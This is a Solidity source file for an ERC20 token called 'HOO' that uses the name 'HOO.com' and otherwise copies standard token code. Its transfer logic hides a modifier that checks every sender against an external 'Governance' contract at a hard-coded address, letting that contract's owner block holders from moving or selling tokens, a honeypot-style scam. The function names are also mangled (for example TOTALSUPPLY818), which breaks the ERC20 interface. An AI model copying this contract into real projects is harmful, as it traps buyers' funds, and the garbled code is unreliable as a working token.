                                                                 

                                                                 

                               
pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY818() external view returns(uint);	

    function BALANCEOF69(address account) external view returns(uint);	

    function TRANSFER142(address recipient, uint amount) external returns(bool);	

    function ALLOWANCE941(address owner, address spender) external view returns(uint);	

    function APPROVE193(address spender, uint amount) external returns(bool);	

    function TRANSFERFROM651(address sender, address recipient, uint amount) external returns(bool);	
    event TRANSFER636(address indexed from, address indexed to, uint value);	
    event APPROVAL38(address indexed owner, address indexed spender, uint value);	
}

interface Governance {
    function ISPARTNER704(address) external returns(bool);	
}

contract Context {
    constructor() internal {}
        

    function _MSGSENDER4() internal view returns(address payable) {	
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0xf9Ce4788fAA416A884F3cE9C38eB910d99e9297A;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY818() public view returns(uint) {	
        return _totalSupply;
    }

    function BALANCEOF69(address account) public view returns(uint) {	
        return _balances[account];
    }

    function TRANSFER142(address recipient, uint amount) public returns(bool) {	
        _TRANSFER782(_MSGSENDER4(), recipient, amount);
        return true;
    }

    function ALLOWANCE941(address owner, address spender) public view returns(uint) {	
        return _allowances[owner][spender];
    }

    function APPROVE193(address spender, uint amount) public returns(bool) {	
        _APPROVE349(_MSGSENDER4(), spender, amount);
        return true;
    }

    function TRANSFERFROM651(address sender, address recipient, uint amount) public returns(bool) {	
        _TRANSFER782(sender, recipient, amount);
        _APPROVE349(sender, _MSGSENDER4(), _allowances[sender][_MSGSENDER4()].SUB83(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE710(address spender, uint addedValue) public returns(bool) {	
        _APPROVE349(_MSGSENDER4(), spender, _allowances[_MSGSENDER4()][spender].ADD497(addedValue));
        return true;
    }

    function DECREASEALLOWANCE684(address spender, uint subtractedValue) public returns(bool) {	
        _APPROVE349(_MSGSENDER4(), spender, _allowances[_MSGSENDER4()][spender].SUB83(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER782(address sender, address recipient, uint amount) internal ENSURE822(sender) {	
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB83(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD497(amount);
        emit TRANSFER636(sender, recipient, amount);
    }

    function _MINT493(address account, uint amount) internal {	
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD497(amount);
        _balances[account] = _balances[account].ADD497(amount);
        emit TRANSFER636(address(0), account, amount);
    }

    function _BURN315(address account, uint amount) internal {	
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB83(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB83(amount);
        emit TRANSFER636(account, address(0), amount);
    }

    modifier ENSURE822(address sender) {	
        require(Governance(_governance).ISPARTNER704(sender));
        _;
    }

    function _APPROVE349(address owner, address spender, uint amount) internal {	
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL38(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME900() public view returns(string memory) {	
        return _name;
    }

    function SYMBOL625() public view returns(string memory) {	
        return _symbol;
    }

    function DECIMALS491() public view returns(uint8) {	
        return _decimals;
    }
}

library SafeMath {
    function ADD497(uint a, uint b) internal pure returns(uint) {	
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB83(uint a, uint b) internal pure returns(uint) {	
        return SUB83(a, b, "SafeMath: subtraction overflow");
    }

    function SUB83(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL57(uint a, uint b) internal pure returns(uint) {	
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV802(uint a, uint b) internal pure returns(uint) {	
        return DIV802(a, b, "SafeMath: division by zero");
    }

    function DIV802(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	
        
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT15(address account) internal view returns(bool) {	
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER451(IERC20 token, address to, uint value) internal {	
        CALLOPTIONALRETURN815(token, abi.encodeWithSelector(token.TRANSFER142.selector, to, value));
    }

    function SAFETRANSFERFROM73(IERC20 token, address from, address to, uint value) internal {	
        CALLOPTIONALRETURN815(token, abi.encodeWithSelector(token.TRANSFERFROM651.selector, from, to, value));
    }

    function SAFEAPPROVE178(IERC20 token, address spender, uint value) internal {	
        require((value == 0) || (token.ALLOWANCE941(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN815(token, abi.encodeWithSelector(token.APPROVE193.selector, spender, value));
    }

    function CALLOPTIONALRETURN815(IERC20 token, bytes memory data) private {	
        require(address(token).ISCONTRACT15(), "SafeERC20: call to non-contract");

        
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { 
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract HOO is ERC20, ERC20Detailed {
    constructor() public ERC20Detailed("HOO.com","HOO",18) {
        _MINT493(msg.sender, 10000 * 10 ** 18);
    }

}